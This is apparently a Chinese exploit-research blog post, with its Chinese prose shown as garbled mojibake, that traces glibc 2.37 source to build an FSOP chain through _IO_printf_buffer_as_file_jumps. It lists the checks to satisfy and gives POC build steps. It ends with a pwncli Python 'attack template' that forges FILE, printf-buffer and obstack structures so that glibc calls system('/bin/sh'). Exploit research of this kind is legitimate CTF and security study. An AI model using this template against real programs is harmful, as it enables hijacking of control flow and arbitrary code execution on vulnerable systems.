<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">__printf_buffer_as_file_overflow (FILE *fp, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_as_file</span> *<span class="title">file</span> =</span> (<span class="keyword">struct</span> __printf_buffer_as_file *) fp;</span><br><span class="line"></span><br><span class="line">  __printf_buffer_as_file_commit (file);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* EOF means only a flush is requested.   */</span></span><br><span class="line">  <span class="keyword">if</span> (ch != EOF)</span><br><span class="line">    __printf_buffer_putc (file-&gt;next, ch);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Ensure that flushing actually produces room.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!__printf_buffer_has_failed (file-&gt;next)</span><br><span class="line">      &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end)</span><br><span class="line">    __printf_buffer_flush (file-&gt;next);</span><br><span class="line">	[...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯¥å‡½æ•°é¦–å…ˆå †ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°å¼ºåˆ¶ç±»å‹è½¬æ¢ä¸º<code>__printf_buffer_as_file</code>å¹¶èµ‹ç»™å˜é‡<code>file</code>ï¼Œç„¶åè°ƒç”¨<code>__printf_buffer_as_file_commit</code>å‡½æ•°ï¼Œ</p>
<h6 id="printf-buffer-as-file-commitå‡½æ•°"><a href="#printf-buffer-as-file-commitå‡½æ•°" class="headerlink" title="__printf_buffer_as_file_commitå‡½æ•°"></a>__printf_buffer_as_file_commitå‡½æ•°</h6><p>è¯¥å‡½æ•°æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__printf_buffer_as_file_commit (<span class="keyword">struct</span> __printf_buffer_as_file *file)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check that the write pointers in the file stream are consistent</span></span><br><span class="line"><span class="comment">     with the next buffer.  */</span></span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr);</span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end);</span><br><span class="line">  assert (file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base);</span><br><span class="line">  assert (file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end);</span><br><span class="line"></span><br><span class="line">  file-&gt;next-&gt;write_ptr = file-&gt;stream._IO_write_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡ºè¯¥å‡½æ•°é€šè¿‡æ–­è¨€å¯¹<code>file</code>ç»“æ„ä½“ä¸­çš„<code>stream</code>ç»“æ„ä½“ä¸<code>next</code>ç»“æ„ä½“ä¸­çš„æˆå‘˜è¿›è¡Œä¸€ç³»åˆ—åˆ¤æ–­ï¼Œç„¶ååšä¸€ä¸ªèµ‹å€¼çš„æ“ä½œã€‚</p>
<h6 id="printf-buffer-putcå‡½æ•°"><a href="#printf-buffer-putcå‡½æ•°" class="headerlink" title="__printf_buffer_putcå‡½æ•°"></a>__printf_buffer_putcå‡½æ•°</h6><p>å¯ä»¥çœ‹åˆ°è‹¥<code>ch != EOF</code>å°±è°ƒç”¨<code>__printf_buffer_putc</code>ï¼Œæºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span></span><br><span class="line">__printf_buffer_putc (<span class="keyword">struct</span> __printf_buffer *buf, <span class="type">char</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;write_ptr != buf-&gt;write_end)</span><br><span class="line">      *buf-&gt;write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    __printf_buffer_putc_1 (buf, ch);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯çŸ¥<code>__printf_buffer_putc</code>åªæ˜¯åšäº†ä¸€äº›æŒ‡é’ˆè®°å½•çš„æ•°å€¼åŠ å‡çš„æ“ä½œï¼Œå¯¹æ­¤æˆ‘ä»¬ä¸ç”¨è¿‡å¤šå…³æ³¨ã€‚</p>
<p>ç„¶åæœ‰åˆ¤æ–­ï¼š<code>if (!__printf_buffer_has_failed (file-&gt;next) &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end)</code></p>
<p>å°±æ˜¯åˆ¤æ–­<code>__printf_buffer_as_file</code>ç»“æ„ä½“ä¸­çš„modeæˆå‘˜æ˜¯ä¸æ˜¯<code>__printf_buffer_mode_failed</code>ä»¥åŠ<code>file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end</code>ï¼Œæˆ‘ä»¬å‡è®¾æ»¡è¶³è¿™ä¸¤ä¸ªæ¡ä»¶ï¼Œä¼šè°ƒç”¨<code>__printf_buffer_flush (file-&gt;next)</code></p>
<h6 id="printf-buffer-flush-å‡½æ•°"><a href="#printf-buffer-flush-å‡½æ•°" class="headerlink" title="__printf_buffer_flush å‡½æ•°"></a>__printf_buffer_flush å‡½æ•°</h6><p>è¿™ä¸ªå‡½æ•°ç¬”è€…æ— æ³•ç›´æ¥åœ¨æºç ä¸­æ‰¾åˆ°ï¼Œä½†æ˜¯é…åˆ<code>gdb</code>ï¼Œç¬”è€…è¿˜æ˜¯å‘ç°äº†å®ƒçš„è››ä¸é©¬è¿¹ã€‚</p>
<p>![image-20230313223405618](ä¸€æ¡æ–°çš„glibc IO_FILEåˆ©ç”¨é“¾ï¼š_IO_printf_buffer_as_file_jumpsåˆ©ç”¨åˆ†æ.assets&#x2F;image-20230313223405618.png)</p>
<p><del>å®ƒå…¶å®å°±æ˜¯<code>__printf_buffer_do_flush</code></del></p>
<p>è¯„è®ºåŒºæœ‰å¸ˆå‚…ï¼ˆid:æˆ‘è¶…å•Šï¼‰è¯´è¯¥å‡½æ•°å…¶å®æ˜¯<code>__printf_buffer_flush =&gt; Xprintf_buffer_flush =&gt; Xprintf (buffer_do_flush) (buf) =&gt; __printf_buffer_do_flush</code>è¿™æ ·çš„ï¼ä½†æ˜¯æˆ‘ä»¬åªéœ€è¦å…³æ³¨<code>__printf_buffer_do_flush</code>ï¼Œæºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__printf_buffer_do_flush (<span class="keyword">struct</span> __printf_buffer *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> (buf-&gt;mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_failed:</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_sprintf:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_snprintf:</span><br><span class="line">      __printf_buffer_flush_snprintf ((<span class="keyword">struct</span> __printf_buffer_snprintf *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">	......</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_fphex_to_wide:</span><br><span class="line">      __printf_buffer_flush_fphex_to_wide</span><br><span class="line">        ((<span class="keyword">struct</span> __printf_buffer_fphex_to_wide *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_obstack:</span><br><span class="line">      __printf_buffer_flush_obstack ((<span class="keyword">struct</span> __printf_buffer_obstack *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  __builtin_trap ();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œæˆ‘ä»¬å…³æ³¨è¿›å…¥<code>__printf_buffer_flush_obstack</code>å‡½æ•°çš„è¿™ä¸€åˆ†æ”¯</p>
<h6 id="printf-buffer-flush-obstackå‡½æ•°"><a href="#printf-buffer-flush-obstackå‡½æ•°" class="headerlink" title="__printf_buffer_flush_obstackå‡½æ•°"></a><code>__printf_buffer_flush_obstack</code>å‡½æ•°</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__printf_buffer_flush_obstack (<span class="keyword">struct</span> __printf_buffer_obstack *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* About to switch buffers, so record the bytes written so far.  */</span></span><br><span class="line">  buf-&gt;base.written += buf-&gt;base.write_ptr - buf-&gt;base.write_base;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;base.write_ptr == &amp;buf-&gt;ch + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Errors are reported via a callback mechanism (presumably for</span></span><br><span class="line"><span class="comment">	 process termination).  */</span></span><br><span class="line">      obstack_1grow (buf-&gt;obstack, buf-&gt;ch);</span><br><span class="line">      [...]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‡è®¾æ»¡è¶³æ‰€æœ‰æ¡ä»¶è¿›å…¥<code>obstack_1grow</code>å®å®šä¹‰ã€‚</p>
<h6 id="obstack-1growå®å®šä¹‰"><a href="#obstack-1growå®å®šä¹‰" class="headerlink" title="obstack_1growå®å®šä¹‰"></a>obstack_1growå®å®šä¹‰</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> obstack_1grow(OBSTACK, datum)					      \</span></span><br><span class="line"><span class="meta">  __extension__								      \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);					      \</span></span><br><span class="line"><span class="meta">       <span class="keyword">if</span> (__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit)			      \</span></span><br><span class="line"><span class="meta">	 _obstack_newchunk (__o, 1);					      \</span></span><br><span class="line"><span class="meta">       obstack_1grow_fast (__o, datum);					      \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°é‡Œé¢è¿˜æœ‰ä¸ªå®å®šä¹‰ï¼Œç„¶ååˆ<code>_obstack_newchunk</code>è¿™ä¸€ä¸ªå‡½æ•°ã€‚</p>
<h6 id="obstack-newchunkå‡½æ•°"><a href="#obstack-newchunkå‡½æ•°" class="headerlink" title="_obstack_newchunkå‡½æ•°"></a>_obstack_newchunkå‡½æ•°</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_obstack_newchunk (<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">old_chunk</span> =</span> h-&gt;chunk;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">  <span class="type">long</span> new_size;</span><br><span class="line">  <span class="type">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="type">long</span> i;</span><br><span class="line">  <span class="type">long</span> already;</span><br><span class="line">  <span class="type">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">  [...]</span><br></pre></td></tr></table></figure>

<p>å‡è®¾æ»¡è¶³æ‰€æœ‰æ¡ä»¶ï¼Œè¿›å…¥<code>CALL_CHUNKFUN</code>è¿™ä¸ªå®å®šä¹‰ï¼Œè¯¥å®å®šä¹‰çš„æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> CALL_CHUNKFUN(h, size) \</span></span><br><span class="line"><span class="meta">  (((h)-&gt;use_extra_arg)							      \</span></span><br><span class="line"><span class="meta">   ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))				      \</span></span><br><span class="line"><span class="meta">   : (*(struct _obstack_chunk *(*)(long))(h)-&gt;chunkfun)((size)))</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å½“<code>(((h)-&gt;use_extra_arg)</code>ä¸ä¸º0æ—¶ï¼Œä¼šè°ƒç”¨<code>(*(h)-&gt;chunkfun)</code>ï¼Œå®ƒçš„å‚æ•°æ˜¯<code>(h)-&gt;extra_arg</code>å’Œ<code>(size)</code>ï¼Œè€Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶<code>(*(h)-&gt;chunkfun)</code>ä¸<code>(h)-&gt;extra_arg</code>ï¼Œä»è€Œæ‰§è¡Œ<code>system(&#39;/bin/sh&#39;)</code>ã€‚</p>
<p>å¦‚æœå„ä½è·Ÿç€æœ¬æ–‡åˆ†æåˆ°è¿™ï¼Œä¼°è®¡å°±è±ç„¶å¼€æœ—äº†ï¼Œå› ä¸ºååŠéƒ¨åˆ†ä¸<code>_IO_obstack_xsputn</code>çš„è°ƒç”¨é“¾ä¸€æ ·ã€‚</p>
<h5 id="å®Œæˆè°ƒç”¨é“¾å¿…è¦çš„ç»•è¿‡æ¡ä»¶"><a href="#å®Œæˆè°ƒç”¨é“¾å¿…è¦çš„ç»•è¿‡æ¡ä»¶" class="headerlink" title="å®Œæˆè°ƒç”¨é“¾å¿…è¦çš„ç»•è¿‡æ¡ä»¶"></a>å®Œæˆè°ƒç”¨é“¾å¿…è¦çš„ç»•è¿‡æ¡ä»¶</h5><p>å›é¡¾ä¸€ä¸‹æ•´ä¸ªåˆ†æè¿‡ç¨‹å¹¶å°†æ‰€æœ‰ç›¸å…³ç»“æ„ä½“ï¼Œå¹¶éƒ½çœ‹æˆ<code>__printf_buffer_as_file</code>ç»“æ„ä½“ï¼Œæœ‰ä»¥ä¸‹æ¡ä»¶ï¼š</p>
<ul>
<li><p><strong>åœ¨<code>__printf_buffer_as_file_overflow</code>å‡½æ•°ä¸­ï¼š</strong></p>
<ul>
<li><code>file-&gt;next-&gt;mode!=__printf_buffer_mode_failed</code> &amp;&amp; <code>file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end</code></li>
</ul>
</li>
<li><p><strong>åœ¨<code>__printf_buffer_as_file_commit</code>å‡½æ•°ä¸­ï¼š</strong></p>
<ul>
<li><code>file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr</code></li>
<li><code>file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end</code></li>
<li><code>file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base</code></li>
<li><code>file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end</code></li>
</ul>
</li>
<li><p><strong>åœ¨<code>__printf_buffer_flush</code>å‡½æ•°ä¸­ï¼š</strong></p>
</li>
<li><p><code>file-&gt;next-&gt;mode =__printf_buffer_mode_obstack</code></p>
</li>
<li><p><strong>åœ¨<code>__printf_buffer_flush_obstack</code>å‡½æ•°ä¸­ï¼š</strong></p>
</li>
<li><p><code>buf-&gt;base.write_ptr == &amp;buf-&gt;ch + 1</code> &lt;&#x3D;&#x3D;&gt; <code>file-&gt;next.write_ptr == &amp;(file-&gt;next) + 0x30 + 1</code></p>
</li>
<li><p><strong>åœ¨<code>obstack_1grow</code>å®å®šä¹‰ä¸­ï¼š</strong></p>
<ul>
<li><code>(struct __printf_buffer_obstack *) file-&gt;obstack-&gt;next_free + 1 &gt; (struct __printf_buffer_obstack *) file-&gt;obstack-&gt;chunk_limit</code></li>
<li><code>(h)-&gt;use_extra_arg</code>ä¸ä¸º0  &lt;&#x3D;&#x3D;&gt; <code>(struct __printf_buffer_obstack *) file-&gt;obstack-&gt;use_extra_arg != 0</code></li>
</ul>
</li>
<li><p>æ³¨ï¼š</p>
<ul>
<li><code>__printf_buffer_mode_obstack</code> å°±æ˜¯<code>0xb</code></li>
</ul>
</li>
</ul>
<h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>æœ¬æ–‡åˆ†æåŸºäº<code>amd64</code>ä¸‹é€šè¿‡<code>FSOP</code>è§¦å‘ã€‚</p>
<p>æˆ‘ä»¬çŸ¥é“<code>FSOP</code> çš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯åŠ«æŒ<code>_IO_list_all</code> çš„å€¼æ¥ä¼ªé€ é“¾è¡¨å’Œå…¶ä¸­çš„<code>_IO_FILE</code> é¡¹ï¼Œä½†æ˜¯å•çº¯çš„ä¼ªé€ åªæ˜¯æ„é€ äº†æ•°æ®è¿˜éœ€è¦æŸç§æ–¹æ³•è¿›è¡Œè§¦å‘ã€‚<code>FSOP</code> é€‰æ‹©çš„è§¦å‘æ–¹æ³•æ˜¯**<code>exit</code>å‡½æ•°<strong>è°ƒç”¨<code>_IO_flush_all_lockp</code>ï¼Œè¿™ä¸ªå‡½æ•°ä¼šåˆ·æ–°<code>_IO_list_all</code> é“¾è¡¨ä¸­æ‰€æœ‰é¡¹çš„æ–‡ä»¶æµï¼Œç›¸å½“äºå¯¹æ¯ä¸ª <code>FILE</code> è°ƒç”¨ <code>fflush</code>ï¼Œä¹Ÿå¯¹åº”ç€</strong>ä¼šè°ƒç”¨<code>_IO_FILE_plus.vtable</code> ä¸­çš„<code>_IO_overflow</code>**ã€‚</p>
<p>æˆ‘ä»¬è°ƒè¯•å¯ä»¥çŸ¥é“<code>_IO_overflow</code>ä½äº<code>vtable</code>æŒ‡é’ˆæ‰€æŒ‡å‘åœ°å€<code>+0x18</code>å¤„ï¼Œä¹Ÿå°±æ˜¯è¯´å½“<code>FSOP</code>å‘ç”Ÿçš„æ—¶å€™ä¼šè°ƒç”¨<code>_IO_FILE_plus.vtable</code> ä¸­çš„<code>_IO_overflow</code>ã€‚å³è°ƒç”¨<code>vtable</code>æŒ‡é’ˆæ‰€æŒ‡å‘åœ°å€ <code>+ 0x18</code>å¤„çš„æ•°æ®ã€‚</p>
<p>![image-20221124020727031](ä¸€æ¡æ–°çš„glibc IO_FILEåˆ©ç”¨é“¾ï¼š_IO_printf_buffer_as_file_jumpsåˆ©ç”¨åˆ†æ.assets&#x2F;image-20221124020727031.png)</p>
<p>é‚£ä¹ˆåªè¦æˆ‘ä»¬ä¼ªé€ ä¸€ä¸ª<code>_IO_FILE</code>ç»“æ„ä½“ï¼Œå°†å®ƒçš„<code>vtable</code>æ›¿æ¢ä¸º<code>&amp;_IO_printf_buffer_as_file_jumps</code>ï¼Œæ­¤æ—¶<code>vtable</code>æŒ‡é’ˆæ‰€æŒ‡åœ°å€<code>+0x18</code>å¤„ä¸º<code>__printf_buffer_as_file_overflow</code>ï¼Œç„¶åä¼ªé€ ä¸Šè¿°æ‰€æœ‰éœ€è¦æ»¡è¶³çš„æ¡ä»¶ï¼ˆè¯¦è§<code>poc</code>ä¸æ”»å‡»æ¨¡æ¿ï¼‰ï¼Œå°±å¯ä»¥å®Œæˆæ”»å‡»ï¼Œå¦‚ä¸‹ï¼š</p>
<p>![image-20230314114950044](ä¸€æ¡æ–°çš„glibc IO_FILEåˆ©ç”¨é“¾ï¼š_IO_printf_buffer_as_file_jumpsåˆ©ç”¨åˆ†æ.assets&#x2F;image-20230314114950044.png)</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><ul>
<li><p>ä¸‹è½½<code>glibc2.37</code>æºç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.nju.edu.cn/gnu/libc/glibc-2.37.tar.gz</span><br></pre></td></tr></table></figure>
</li>
<li><p>è§£å‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf glibc-2.37.tar.gz</span><br></pre></td></tr></table></figure>
</li>
<li><p>ç¼–è¯‘ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">../configure --prefix=ä½ æƒ³æ”¾ç½®å¯æ‰§è¡Œæ–‡ä»¶çš„ç»å¯¹è·¯å¾„</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
</li>
<li><p>å‡†å¤‡å¥½POC</p>
<p>å¯ä»¥ç‚¹å‡»<a target="_blank" rel="noopener" href="https://share.weiyun.com/TSaLBBPi">è¿™é‡Œ</a>ä¸‹è½½æ–‡ä»¶ï¼ˆæœ¬æ¥æ˜¯ç›´æ¥å±•ç¤ºæºç çš„â€¦ä½†æ˜¯æ”¾åˆ°çœ‹é›ªé‡Œæ’ç‰ˆå°±é”™ä½äº†â€¦ï¼‰</p>
</li>
<li><p>ç¼–è¯‘POC</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc POC.c -g -o POC</span><br></pre></td></tr></table></figure>
</li>
<li><p>patchelf</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-rpath ä½ å­˜æ”¾ç¼–è¯‘åçš„æ–‡ä»¶è·¯å¾„/bin/lib ./POC </span><br><span class="line">patchelf --set-interpreter  ä½ å­˜æ”¾ç¼–è¯‘åçš„æ–‡ä»¶è·¯å¾„/bin/lib/ld-linux-x86-64.so.2 ./POC</span><br></pre></td></tr></table></figure>
</li>
<li><p>è¿è¡Œ</p>
<p>![image-20230314154110136](ä¸€æ¡æ–°çš„glibc IO_FILEåˆ©ç”¨é“¾ï¼š_IO_printf_buffer_as_file_jumpsåˆ©ç”¨åˆ†æ.assets&#x2F;image-20230314154110136.png)</p>
</li>
</ul>
<h2 id="æ”»å‡»æ¨¡æ¿"><a href="#æ”»å‡»æ¨¡æ¿" class="headerlink" title="æ”»å‡»æ¨¡æ¿"></a>æ”»å‡»æ¨¡æ¿</h2><p>ä»¥ä¸‹æ”»å‡»æ¨¡æ¿å…¨æ˜¯åœ¨<code>FSOP</code>ä¸‹çš„ï¼Œå¯ä»¥ç‚¹å‡»<a target="_blank" rel="noopener" href="https://share.weiyun.com/iSWjdvGY">è¿™é‡Œ</a>ä¸‹è½½é™„ä»¶å°è¯•ä»¥ä¸‹ä¸‰ç§æ”»å‡»ã€‚</p>
<h3 id="åˆ†åˆ«ä¼ªé€ -printf-bufferä¸obstackç»“æ„ä½“"><a href="#åˆ†åˆ«ä¼ªé€ -printf-bufferä¸obstackç»“æ„ä½“" class="headerlink" title="åˆ†åˆ«ä¼ªé€ __printf_bufferä¸obstackç»“æ„ä½“"></a>åˆ†åˆ«ä¼ªé€ __printf_bufferä¸obstackç»“æ„ä½“</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line">fp = IO_FILE_plus_struct()</span><br><span class="line">fp.vtable = <span class="number">0x1ced60</span> + lb</span><br><span class="line">fp._IO_write_ptr = leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x28</span></span><br><span class="line">fp._IO_write_end = leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>    <span class="comment">#0x30</span></span><br><span class="line">fp._IO_write_base = <span class="number">0x0</span>                         <span class="comment">#0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pd = flat(</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="number">0x0</span>:<span class="built_in">bytes</span>(fp),</span><br><span class="line">    <span class="comment">#------fake __printf_buffer---</span></span><br><span class="line">    <span class="number">0xe0</span>:leak_heap+<span class="number">0xe8</span>,</span><br><span class="line">    <span class="number">0xe8</span>:[</span><br><span class="line">    <span class="number">0</span>,  <span class="comment">#write_base 0</span></span><br><span class="line">    <span class="number">0</span>,  <span class="comment">#write_ptr  8</span></span><br><span class="line">    leak_heap+<span class="number">0xe8</span> + <span class="number">0x30</span> + <span class="number">1</span>,   <span class="comment">#write_end 0x10</span></span><br><span class="line">    leak_heap+<span class="number">0x110</span>,   <span class="comment">#written 0x18</span></span><br><span class="line">    p32(<span class="number">11</span>),  <span class="comment">#mode  0x20</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="comment">#----------------------------</span></span><br><span class="line">    <span class="comment">#------fake obstack----------</span></span><br><span class="line">    <span class="number">0x110</span>:leak_heap+<span class="number">0x110</span>,</span><br><span class="line">    <span class="number">0x110</span>+<span class="number">0x18</span>:[</span><br><span class="line">    <span class="string">&#x27;/bin/sh\x00&#x27;</span>,</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="number">0x110</span>+<span class="number">0x38</span>:libc.sym.system,</span><br><span class="line">    <span class="number">0x110</span>+<span class="number">0x48</span>:leak_heap+<span class="number">0x110</span>+<span class="number">0x18</span>,</span><br><span class="line">    <span class="number">0x110</span>+<span class="number">0x50</span>:[<span class="number">0xff</span>]</span><br><span class="line">    <span class="comment">#----------------------------</span></span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

